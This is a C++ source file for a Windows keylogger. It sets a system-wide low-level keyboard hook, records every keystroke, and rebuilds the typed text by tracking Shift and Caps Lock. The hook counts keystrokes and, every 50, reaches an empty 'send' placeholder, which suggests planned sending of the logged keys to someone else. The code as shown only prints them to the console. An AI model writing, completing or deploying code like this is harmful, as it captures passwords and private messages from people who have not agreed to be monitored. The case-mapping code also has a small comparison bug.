#include <iostream>
#include <Windows.h>

using namespace std;
bool checkCapslock = false;
bool checkShift = false;
int dem = 0;
void checkKey(const char* nameKey) {
    if (strcmp(nameKey, "Space") == 0) {
        cout << " ";
    }
    else if (strcmp(nameKey, "Caps Lock") == 0) {
        if (checkCapslock == true) {
            checkCapslock = false;
        }
        else checkCapslock = true;
    }
    else if (strcmp(nameKey, "Shift") == 0 || strcmp(nameKey, "Right Shift") == 0) {
        checkShift = true;
    }
    else if (strcmp(nameKey, "Tab") == 0) {
        cout << "    ";
    }
    else if (strcmp(nameKey, "Enter") == 0){
        cout << "\n";
    }
    else if (strcmp(nameKey, "Backspace") == 0) {
        cout << "|b|";
    }
    else {
        if (size(string(nameKey)) == 1) {
            char key = nameKey[0];
            if (checkCapslock == true) {
                if (checkShift == true) {
                    if (isalpha(key) == true) {
                        cout << (char)tolower(key);
                    }
                    else {
                        switch (key)
                        {
                        case '1':
                            cout << '!';
                            break;
                        case '2':
                            cout << '@';
                            break;
                        case '3':
                            cout << '#';
                            break;
                        case '4':
                            cout << '$';
                            break;
                        case '5':
                            cout << '%';
                            break;
                        case '6':
                            cout << '^';
                            break;
                        case '7':
                            cout << '&';
                            break;
                        case '8':
                            cout << '*';
                            break;
                        case '9':
                            cout << '(';
                            break;
                        case '0':
                            cout << ')';
                            break;
                        case '-':
                            cout << '_';
                            break;
                        case '=':
                            cout << '+';
                            break;
                        case '`':
                            cout << '~';
                            break;
                        case '[':
                            cout << '{';
                            break;
                        case ']':
                            cout << '}';
                            break;
                        case '\\':
                            cout << '|';
                            break;
                        case ';':
                            cout << ':';
                            break;
                        case '\'':
                            cout << '"';
                            break;
                        case ',':
                            cout << '<';
                            break;
                        case '.':
                            cout << '>';
                            break;
                        case '/':
                            cout << '?';
                            break;
                        default:
                            break;
                        }
                    }
                }
                else {
                    cout << (char)toupper(key);
                }
            }
            else {
                if (checkShift == true) {
                    if (isalpha(key) == true) {
                        cout << (char)toupper(key);
                    }
                    else {
                        switch (key)
                        {
                        case '1':
                            cout << '!';
                            break;
                        case '2':
                            cout << '@';
                            break;
                        case '3':
                            cout << '#';
                            break;
                        case '4':
                            cout << '$';
                            break;
                        case '5':
                            cout << '%';
                            break;
                        case '6':
                            cout << '^';
                            break;
                        case '7':
                            cout << '&';
                            break;
                        case '8':
                            cout << '*';
                            break;
                        case '9':
                            cout << '(';
                            break;
                        case '0':
                            cout << ')';
                            break;
                        case '-':
                            cout << '_';
                            break;
                        case '=':
                            cout << '+';
                            break;
                        case '`':
                            cout << '~';
                            break;
                        case '[':
                            cout << '{';
                            break;
                        case ']':
                            cout << '}';
                            break;
                        case '\\':
                            cout << '|';
                            break;
                        case ';':
                            cout << ':';
                            break;
                        case '\'':
                            cout << '"';
                            break;
                        case ',':
                            cout << '<';
                            break;
                        case '.':
                            cout << '>';
                            break;
                        case '/':
                            cout << '?';
                            break;
                        default:
                            break;
                        }
                    }
                }
                else {
                    cout << (char)tolower(key);
                }
            }
        }
        else {
            cout << nameKey;
        }
    }
}
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    dem++;
    if (dem == 50) {
        dem = 0;
        //send
        //end send;
    }
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
        checkCapslock = true;
    }
    else {
        checkCapslock = false;
    }
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        UINT scanCode = MapVirtualKey(p->vkCode, MAPVK_VK_TO_VSC);
        LONG lParamKeyName = scanCode << 16;

        char nameKey[100] = { 0 };
        int resultsGetNameKey = GetKeyNameTextA(lParamKeyName, nameKey, sizeof(nameKey));

        if (resultsGetNameKey > 0) {
            checkKey(nameKey);
        }
    }
    else if (nCode == HC_ACTION && wParam == WM_KEYUP) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        UINT scanCode = MapVirtualKey(p->vkCode, MAPVK_VK_TO_VSC);
        LONG lParamKeyName = scanCode << 16;

        char nameKey[100] = { 0 };
        int resultsGetNameKey = GetKeyNameTextA(lParamKeyName, nameKey, sizeof(nameKey));
        if (resultsGetNameKey > 0 &&  (strcmp(nameKey, "Shift") == 0 || strcmp(nameKey, "Right Shift") == 0)){
            checkShift = false;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}   

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook); 
    return 0;
}
